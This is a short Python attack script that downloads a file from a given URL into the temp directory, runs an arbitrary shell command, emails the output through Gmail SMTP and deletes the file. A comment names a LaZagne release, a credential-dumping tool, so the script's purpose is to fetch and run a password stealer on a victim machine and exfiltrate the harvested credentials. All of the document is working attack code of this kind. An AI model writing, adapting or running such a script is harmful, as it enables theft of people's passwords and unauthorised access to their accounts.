#!/usr/bin/env python

import requests, subprocess, smtplib, re, argparse, os, tempfile

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--email", dest="email", help="SMTP Email")
    parser.add_argument("-p", "--password", dest="password", help="SMTP Password")
    parser.add_argument("-u", "--url", dest="url", help="Url of file to download")
    parser.add_argument("-n", "--name", dest="name", help="name to save file as")
    parser.add_argument("-c", "--command", dest="command", help="Command to run after download")
    options = parser.parse_args()
    if not options.email:
        # handle error
        parser.error("[-] Please specify an email for the SMTP account, use --help for more info")
    if not options.password:
        # handle error
        parser.error("[-] Please specify a password for the SMTP account, use --help for more info")
    if not options.url:
        # handle error
        parser.error("[-] Please specify a url to download the file from, use --help for more info")
    if not options.name:
        # handle error
        parser.error("[-] Please specify a name to save file as, use --help for more info")
    if not options.command:
        # handle error
        parser.error("[-] Please specify a command to run after download, use --help for more info")
    return options

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)

def download(url, name):
    get_response = requests.get(url)
    # print(get_response.content)
    with open(name, "wb") as outfile:
        outfile.write(get_response.content)

options = get_arguments()
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
#https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe
download(options.url, options.name)
result = subprocess.check_output(options.command, shell=True)
send_mail(options.email,options.password, result)
os.remove(options.name)